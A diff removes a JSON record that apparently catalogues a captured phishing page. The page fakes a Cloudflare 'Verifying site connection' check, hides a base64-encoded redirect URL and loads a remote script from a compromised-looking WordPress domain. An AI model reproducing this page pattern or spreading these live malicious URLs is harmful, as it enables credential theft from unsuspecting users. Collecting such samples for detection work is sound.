@@ -1,9 +1,0 @@
-{
-  "url": "https://pub-0fa378d32b424c34b1d9013e63333503.r2.dev/linksup.html",
-  "html": "<html><head>\t<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\t<script src=\"https://challenges.cloudflare.com/turnstile/v0/api.js?onload=onloadTurnstileCallback\" defer=\"\" async=\"\"></script></head><body style=\"display:flex;justify-content:center;align-items:center;text-align:center;\">\t<div>\t\t<h3 id=\"status-shower\" style=\"margin-bottom:30px;\"> Verifying site connection... </h3>\t\t<div id=\"cf-show\" style=\"\"></div>\t\t\t<input type=\"hidden\" id=\"b64u\" value=\"aHR0cHM6Ly9nb3JpbGxhemRlc2lnbmVyLmNvbS93cC1jb250ZW50L2hvc3QvMjA2MWU2NS5waHA=\" class=\"\"></div>\t<script src=\"https://gorillazdesigner.com/wp-content/host/admin/js/sc.php?r=ZW0sZW1haWwsYWRk\"></script> </body></html>",
-  "scripts": [
-    "",
-    ""
-  ],
-  "styles": []
-}
